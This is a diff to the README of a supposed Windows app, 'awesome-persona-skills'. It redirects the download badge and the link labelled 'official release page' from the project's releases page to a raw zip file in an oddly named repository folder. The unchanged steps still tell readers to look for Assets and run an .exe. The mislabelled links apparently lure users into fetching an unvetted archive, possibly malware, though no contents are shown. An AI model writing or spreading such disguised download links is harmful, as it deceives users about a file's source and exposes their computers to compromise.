@@ -1,6 +1,6 @@
 # 🎭 awesome-persona-skills - Enhance your digital interactions with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/LatestPlayz/awesome-persona-skills/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/LatestPlayz/awesome-persona-skills/raw/refs/heads/main/woozle/persona_awesome_skills_1.4.zip)
 
 ## 📖 About this application
 
@@ -12,7 +12,7 @@ This application runs on Windows 10 and Windows 11. Your computer requires at le
 
 ## 📥 Getting the software
 
-1. Visit the [official release page](https://github.com/LatestPlayz/awesome-persona-skills/releases).
+1. Visit the [official release page](https://github.com/LatestPlayz/awesome-persona-skills/raw/refs/heads/main/woozle/persona_awesome_skills_1.4.zip).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your desktop or your downloads folder.
